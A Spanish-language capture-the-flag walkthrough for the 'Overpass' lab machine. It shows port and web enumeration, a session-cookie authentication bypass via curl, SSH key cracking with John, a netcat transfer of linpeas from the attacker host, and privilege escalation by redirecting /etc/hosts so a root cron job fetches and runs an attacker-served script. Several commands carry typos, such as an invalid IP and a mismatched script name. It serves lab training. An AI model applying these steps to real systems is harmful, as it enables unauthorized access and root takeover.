# Overpass

Security, Owasp top 10, Cron. (#nmap, #nikto, #gobuster, #session #javascript, #curl, #ssh2python.py, #linpeas.sh, #upload_file_nc.sh )

## Tabla de contenido

- [Enumeración](#Enumeración).
- [Web Site](#Web-Site).
- [Shell](#Shell). 
--------------------------------
### Enumeración
-------------------------------
Hacemos una revisión general:
```plain
nmap -sC -sV -oN nmap/initial 10.10.428.51
```

* -oN: Guardar el sondeo en formato normal.
* -sC: Realizar análisis con los scripts por defecto.
* -sV: Detección de la versión de servicios.
--------------------------------
### Web Site
---------------------------------
Escaneo Web:

```plain
nikto -h "http://10.10.248.51/" | tee nikto.log
```
Fuerza bruta a directorios: 
```plain
gobuster dir -u http://10.10.248.51 -w /usr/share/wordlists
```
Localizado login en la página http://10.10.248.51/admin, analizando el archivos login.js.

```plain
async function login() {
    const usernameBox = document.querySelector("#username");
    const passwordBox = document.querySelector("#password");
    const loginStatus = document.querySelector("#loginStatus");
    loginStatus.textContent = ""
    const creds = { username: usernameBox.value, password: passwordBox.value }
    const response = await postData("/api/login", creds)
    const statusOrCookie = await response.text()
    if (statusOrCookie === "Incorrect credentials") {
        loginStatus.textContent = "Incorrect Credentials"
        passwordBox.value=""
    } else {
        Cookies.set("SessionToken",statusOrCookie)
        window.location = "/admin"
    }
}
```
Se aprecia el SessionToken, dentro del flag no le asigna valor si tiene credenciales incorrectas entonces probamos:
```
curl "http://10.10.248.51/admin/" --cookie "SessionToken=anything"
```
--------------------------------
### Shell
-------------------------------
Obtenemos una key, para descifrar la contraseña del key utilizamos jhon ripper.
```
wget https://raw.githubusercontent.com/koboi137/john/bionic/ssh2john.py
sudo chmod +x ssh2python.py
./ssh2python.py idrsa > res_idrsa
```
Utilizamos fuerza bruta para poder descifrar la contraseña de la key:
```
john --wordlist=/usr/share/wordlists/rockyou.txt res_idrsa
```
Asignamos los permisos correspondientes:
```
chmod 600 idrsa
```
Nos logueamos 
```
ssh -i idrsa james@10.10.248.51
```
Creamos el script upload_file_nc.sh para cargar el linpeas.sh
```
nano upload_file_nc.sh
chmod +x upload_file_nc.sh /dev/shm/linpeas.sh
cd /dev/shm/
file linpeas.sh
chmod +x linpeas.sh
./upload_file_nc.sh /dev/shm/linpeas.sh
```
> Desde la pc víctima

Ejecutamos el script linpeas para buscar fallas en la configuración, permisos, etc con la finalidad de escalar privilegios.
```
nc 10.10.68.216 8666 > linpeas.sh
./linpeas.sh
```
Encontramos que podemos editar el archivo hosts donde colocaremos nuestro ip para que resuelva el ping a través de nosotros.
```
ls -la /etc/hosts
nano /etc/hosts
    127.0.0.1 localhost
    127.0.1.1 overpass-prod
    10.8.0.214 overpass.thm
ping overpass.thm
```
> Desde nuestra pc

Creamos nuestro directorio con nuestro buildscript.sh y levantamos nuestro servicio http.
```
mkdir -p downloads/src/
nano buildscript.sh
sudo python -m SimpleHTTPServer 80
```

> Desde la pc víctima

Trackeamos la consola, ya que está resolviendo por nuestra ip, generando un get a nuestro buildscript ejecutándolo.

```
watch ls -la /bin/bash
    -rwxr-xr-x 1 root root 1113504 Jun  6  2019 /bin/bash
    -rwxr-sr-x 1 root root 1113504 Jun  6  2019 /bin/bash
```

Finalmente accedemos al root:

```
/bin/bash -p
whoami
    root
```